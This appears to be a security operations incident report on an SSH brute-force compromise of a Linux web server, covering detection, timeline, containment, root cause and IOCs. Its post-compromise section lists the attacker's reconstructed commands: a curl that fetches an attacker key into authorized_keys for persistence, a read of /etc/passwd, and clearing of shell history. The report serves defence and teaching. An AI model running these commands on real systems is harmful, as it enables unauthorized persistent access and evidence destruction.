# Incident Report: SSH Brute-Force Attack and Unauthorized Access

**Incident ID:** INC-2026-0042
**Date Opened:** 2026-01-14 06:18 UTC
**Date Closed:** 2026-01-15 19:30 UTC
**Incident Handler:** SOC Analyst (Tier 2)
**Severity:** P2 -- High
**Classification:** Unauthorized Access
**Status:** Closed

---

## Executive Summary

On January 14, 2026, at 06:18 UTC, a SIEM correlation rule triggered an alert for excessive failed SSH authentication attempts against the Linux web server `web-prod-03` (10.10.4.27). Investigation revealed a brute-force campaign originating from the external IP address 203.0.113.47. The attacker successfully authenticated at 06:42 UTC using the service account `deploy_svc`, which had a weak password and no multi-factor authentication. The attacker established persistence via SSH authorized keys and performed reconnaissance. Containment was achieved within 38 minutes of detection. No data exfiltration was confirmed. The compromised account was disabled, the attacker's access was revoked, and the server was hardened. Root cause was determined to be a service account with a weak password exposed to direct SSH access from the internet due to a firewall rule misconfiguration.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Observed Activity |
|--------|-----------|-----|-------------------|
| Initial Access | Brute Force: Password Guessing | T1110.001 | Thousands of SSH login attempts from 203.0.113.47 |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 | Successful login using guessed credentials for `deploy_svc` |
| Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 | Attacker added public key to `deploy_svc` authorized_keys |
| Discovery | System Information Discovery | T1082 | Commands: `uname -a`, `cat /etc/os-release` |
| Discovery | Account Discovery: Local Account | T1087.001 | Commands: `cat /etc/passwd`, `whoami`, `id` |
| Discovery | Network Service Discovery | T1046 | Commands: `ss -tupan`, `netstat -an` |
| Defense Evasion | Indicator Removal: Clear Linux or Mac System Logs | T1070.002 | Attempted `history -c` and truncation of `.bash_history` |

---

## Timeline of Events

| Timestamp (UTC) | Source | Event |
|-----------------|--------|-------|
| 2026-01-14 04:31 | Firewall logs | First SSH connection attempt from 203.0.113.47 to 10.10.4.27:22 |
| 2026-01-14 04:31 -- 06:42 | auth.log | Sustained brute-force campaign: 14,847 failed authentication attempts across multiple usernames |
| 2026-01-14 06:18 | SIEM (Splunk) | Alert `SSH-BRUTE-FORCE-THRESHOLD` triggered: >500 failed SSH logins from single source in 1 hour |
| 2026-01-14 06:22 | SOC Analyst | Alert acknowledged and triage initiated |
| 2026-01-14 06:28 | SOC Analyst | SIEM query confirms ongoing brute-force from 203.0.113.47; source IP researched on AbuseIPDB (score: 100%, reported 2,341 times for SSH brute force) |
| 2026-01-14 06:35 | SOC Analyst | Firewall rule review reveals port 22 is open to 0.0.0.0/0 for `web-prod-03` -- misconfiguration identified |
| 2026-01-14 06:42 | auth.log | **Successful SSH authentication** for user `deploy_svc` from 203.0.113.47 |
| 2026-01-14 06:44 | SOC Analyst | Successful login detected during live monitoring; incident escalated to P2 |
| 2026-01-14 06:45 | SOC Analyst | Initiated containment: firewall rule updated to block 203.0.113.47 |
| 2026-01-14 06:47 | SOC Analyst | Active SSH session from 203.0.113.47 terminated on `web-prod-03` |
| 2026-01-14 06:48 | SOC Analyst | `deploy_svc` account locked and password expired |
| 2026-01-14 06:50 | SOC Analyst | Firewall rule corrected: SSH access to `web-prod-03` restricted to management VLAN (10.10.100.0/24) only |
| 2026-01-14 06:56 | SOC Analyst | Attacker's SSH public key removed from `/home/deploy_svc/.ssh/authorized_keys` |
| 2026-01-14 07:15 | IR Lead | Evidence collection initiated: auth.log, syslog, bash_history, process listing, network connections captured |
| 2026-01-14 07:30 | IR Lead | Post-compromise activity analysis: attacker ran reconnaissance commands but no privilege escalation, no malware installation, no outbound data transfer confirmed |
| 2026-01-14 08:00 | IR Lead | Scope assessment: no evidence of lateral movement to other hosts; `deploy_svc` had no sudo privileges on other systems |
| 2026-01-14 09:00 | SOC Analyst | Full scan of `web-prod-03` with ClamAV and rkhunter -- no malware or rootkits detected |
| 2026-01-14 10:30 | IT Operations | `deploy_svc` password reset to a 24-character randomly generated password; SSH key-only authentication enforced |
| 2026-01-14 14:00 | IR Lead | Audit of all internet-facing SSH rules across the firewall initiated |
| 2026-01-15 11:00 | IT Operations | Fail2ban deployed on all internet-facing Linux servers |
| 2026-01-15 16:00 | IR Lead | Post-incident review meeting conducted |
| 2026-01-15 19:30 | IR Lead | Incident closed |

---

## Technical Analysis

### Detection

The incident was detected by the following SIEM correlation rule:

```
# Splunk correlation rule: SSH-BRUTE-FORCE-THRESHOLD
index=linux sourcetype=linux:auth
  (process="sshd" AND "Failed password")
  earliest=-1h
| stats count as failed_attempts dc(user) as targeted_users by src_ip
| where failed_attempts > 500
| lookup abuseipdb_cache src_ip OUTPUT abuse_score
```

The rule fires when a single source IP produces more than 500 failed SSH authentication attempts in a rolling one-hour window. The alert was generated at 06:18 UTC, approximately 1 hour and 47 minutes after the brute-force campaign began.

### Investigation: Log Analysis

**auth.log examination:**

```
# Failed attempts (sample -- 14,847 total)
Jan 14 04:31:17 web-prod-03 sshd[28401]: Failed password for invalid user admin from 203.0.113.47 port 43210 ssh2
Jan 14 04:31:18 web-prod-03 sshd[28403]: Failed password for invalid user test from 203.0.113.47 port 43212 ssh2
Jan 14 04:31:19 web-prod-03 sshd[28405]: Failed password for root from 203.0.113.47 port 43214 ssh2
Jan 14 04:31:20 web-prod-03 sshd[28407]: Failed password for invalid user ubuntu from 203.0.113.47 port 43216 ssh2
...
Jan 14 06:41:55 web-prod-03 sshd[31204]: Failed password for deploy_svc from 203.0.113.47 port 51002 ssh2
Jan 14 06:42:03 web-prod-03 sshd[31206]: Failed password for deploy_svc from 203.0.113.47 port 51004 ssh2
Jan 14 06:42:11 web-prod-03 sshd[31208]: Accepted password for deploy_svc from 203.0.113.47 port 51006 ssh2
Jan 14 06:42:11 web-prod-03 sshd[31208]: pam_unix(sshd:session): session opened for user deploy_svc(uid=1001) by (uid=0)
```

**Usernames targeted (top 10 by frequency):**

| Username | Attempts |
|----------|----------|
| root | 3,412 |
| admin | 2,104 |
| deploy | 1,887 |
| ubuntu | 1,203 |
| deploy_svc | 1,056 |
| test | 988 |
| user | 876 |
| www-data | 743 |
| git | 612 |
| postgres | 544 |

The brute-force tool used a dictionary of common usernames and passwords. The `deploy_svc` account was compromised because it used the password `Deploy2024!`, which was in the attacker's dictionary.

### Investigation: Source IP Research

| Source | Result |
|--------|--------|
| AbuseIPDB | Confidence score: 100%. Reported 2,341 times. Categories: SSH brute force, hacking. Country: RU |
| Shodan | Open ports: 22, 80, 8080. Running various scanning tools. Identified as a known VPS provider frequently used for attacks |
| VirusTotal | 12/89 vendors flagged the IP as malicious |
| Internal logs | No prior connections from this IP in the last 90 days |

### Investigation: Post-Compromise Activity

The attacker's session lasted approximately 5 minutes (06:42 -- 06:47 UTC). Analysis of the bash history (partially recovered after the attacker attempted to clear it) and process execution logs revealed the following commands:

```bash
# Attacker commands (reconstructed from process accounting and partially cleared history)
whoami                                    # T1033 System Owner/User Discovery
id                                        # T1033
uname -a                                  # T1082 System Information Discovery
cat /etc/os-release                       # T1082
cat /etc/passwd                           # T1087.001 Account Discovery
ss -tupan                                 # T1049 System Network Connections Discovery
w                                         # Check who else is logged in
curl -s http://203.0.113.47:8080/key.pub >> ~/.ssh/authorized_keys   # T1098.004 Persistence
history -c                                # T1070.002 Defense Evasion
echo "" > ~/.bash_history                 # T1070.002 Defense Evasion
```

**Key finding:** The attacker downloaded and installed an SSH public key for persistent access. This key was retrieved from the attacker's infrastructure (203.0.113.47:8080) and appended to the `deploy_svc` user's authorized_keys file. This would have allowed password-less re-entry even after a password change.

**No evidence of:**
- Privilege escalation (deploy_svc had limited sudo access -- `sudo -l` showed no permitted commands)
- Malware installation
- Outbound data exfiltration (no large outbound transfers in netflow data)
- Lateral movement (no SSH connections from web-prod-03 to other internal hosts)

---

## Impact Assessment

| Category | Assessment |
|----------|-----------|
| Systems affected | 1 (web-prod-03) |
| Accounts compromised | 1 (deploy_svc) |
| Data exposure | No confirmed data access or exfiltration. The deploy_svc account had read access to the web application directory but no access to databases or customer data. |
| Downtime | None -- the server remained operational throughout |
| Financial impact | Minimal -- incident response labor costs only (estimated 12 analyst-hours) |
| Regulatory impact | None -- no regulated data was accessed |

---

## Containment, Eradication & Recovery

### Containment Actions

1. Blocked 203.0.113.47 at the perimeter firewall (inbound and outbound)
2. Terminated the active SSH session on web-prod-03
3. Locked the `deploy_svc` account
4. Corrected the firewall rule: restricted SSH access to management VLAN only

### Eradication Actions

1. Removed the attacker's SSH public key from `/home/deploy_svc/.ssh/authorized_keys`
2. Inspected all other user accounts for unauthorized SSH keys
3. Scanned the host with ClamAV (full filesystem scan) and rkhunter (rootkit check) -- both clean
4. Verified no unauthorized cron jobs, systemd services, or startup scripts were added
5. Checked for unauthorized SUID/SGID binaries -- none found
6. Verified file integrity of system binaries against package manager checksums:
   ```bash
   rpm -Va 2>/dev/null || dpkg --verify 2>/dev/null
   ```

### Recovery Actions

1. Reset `deploy_svc` password to a 24-character randomly generated string
2. Configured `deploy_svc` for SSH key-only authentication (password authentication disabled for this account)
3. Deployed fail2ban on web-prod-03 and all other internet-facing Linux servers:
   ```
   # /etc/fail2ban/jail.local
   [sshd]
   enabled = true
   port = ssh
   filter = sshd
   logpath = /var/log/auth.log
   maxretry = 5
   findtime = 600
   bantime = 3600
   ```
4. Monitored `web-prod-03` for 72 hours post-remediation with enhanced logging -- no anomalous activity detected

---

## Root Cause Analysis

- **Immediate cause:** The `deploy_svc` service account had a weak, guessable password (`Deploy2024!`) that was cracked through brute-force attack.
- **Contributing factors:**
  - SSH port 22 was exposed to the internet due to an overly permissive firewall rule (`0.0.0.0/0 -> 10.10.4.27:22 ALLOW`) that was created during initial server provisioning and never tightened.
  - No brute-force protection (fail2ban or equivalent) was configured on the server.
  - No MFA was required for SSH authentication.
  - The service account password had not been rotated since the account was created.
- **Root cause:** Lack of a standardized server hardening baseline that enforces SSH access restrictions, key-only authentication for service accounts, and brute-force protection as part of the provisioning process.

---

## Recommendations

| Priority | Recommendation | Owner | Target Date | Status |
|----------|---------------|-------|-------------|--------|
| Critical | Audit and restrict all internet-facing SSH rules across the entire firewall rulebase | Network Security | 2026-01-28 | Complete |
| High | Deploy fail2ban or CrowdSec on all Linux servers | IT Operations | 2026-02-15 | Complete |
| High | Enforce SSH key-only authentication for all service accounts | IT Operations | 2026-02-15 | Complete |
| High | Implement a password policy requiring minimum 16-character passwords for service accounts, with mandatory rotation every 90 days | IAM Team | 2026-02-28 | In Progress |
| Medium | Implement MFA for SSH access to production servers (e.g., PAM module with TOTP or certificate-based auth) | IT Security | 2026-03-31 | Not Started |
| Medium | Create a server hardening baseline standard (CIS Benchmark) and validate compliance during provisioning | IT Security | 2026-03-31 | Not Started |
| Low | Tune SIEM alert threshold: consider alerting at 100 failed attempts instead of 500 to reduce detection time | SOC | 2026-02-15 | Complete |

---

## Lessons Learned

### What Went Well

- The SIEM correlation rule successfully detected the brute-force campaign
- The SOC analyst quickly identified the successful authentication within the noise of failed attempts
- Containment was fast once the compromise was confirmed (5 minutes from detection of successful login to session termination)
- Evidence was properly preserved before remediation actions

### What Could Be Improved

- **Detection time:** The brute-force campaign ran for nearly 2 hours before triggering an alert. The threshold of 500 failed attempts in 1 hour could be lowered, and a rate-based detection (e.g., >10 failures per minute) would trigger faster.
- **Preventive controls:** SSH should never have been exposed to the internet without additional protections. The firewall rule was created during initial provisioning and was not reviewed.
- **Service account management:** No process existed for auditing service account password strength or enforcing rotation. The `deploy_svc` account used a weak password that had been set during initial creation and never changed.
- **Baseline hardening:** No standardized server hardening checklist was applied during provisioning.

---

## Appendix A: IOCs

| Type | Value | Context |
|------|-------|---------|
| IP Address | 203.0.113.47 | Brute-force source and C2 for SSH key delivery |
| URL | `http://203.0.113.47:8080/key.pub` | Attacker's SSH public key distribution point |
| SSH Public Key | `ssh-rsa AAAAB3Nza...truncated...attacker@kali` | Attacker's persistence key (full key retained in evidence) |
| Username | deploy_svc | Compromised local account |

## Appendix B: Evidence Log

| Evidence ID | Description | Source | Collected By | Timestamp | SHA256 | Location |
|-------------|-------------|--------|-------------|-----------|--------|----------|
| EV-042-001 | auth.log (Jan 14) | web-prod-03 | SOC Analyst | 2026-01-14 07:15 | a3f2e8...d91b | /evidence/INC-2026-0042/ |
| EV-042-002 | .bash_history (deploy_svc) | web-prod-03 | SOC Analyst | 2026-01-14 07:16 | 7bc41a...e3f0 | /evidence/INC-2026-0042/ |
| EV-042-003 | authorized_keys (deploy_svc) | web-prod-03 | SOC Analyst | 2026-01-14 07:17 | 2d1f98...c4a2 | /evidence/INC-2026-0042/ |
| EV-042-004 | Process listing (ps auxf) | web-prod-03 | SOC Analyst | 2026-01-14 07:18 | 58e3b1...a7d4 | /evidence/INC-2026-0042/ |
| EV-042-005 | Network connections (ss -tupan) | web-prod-03 | SOC Analyst | 2026-01-14 07:18 | 91c4d2...b8e6 | /evidence/INC-2026-0042/ |
| EV-042-006 | Firewall rule export | fw-edge-01 | SOC Analyst | 2026-01-14 07:25 | f4a7c3...d2b1 | /evidence/INC-2026-0042/ |
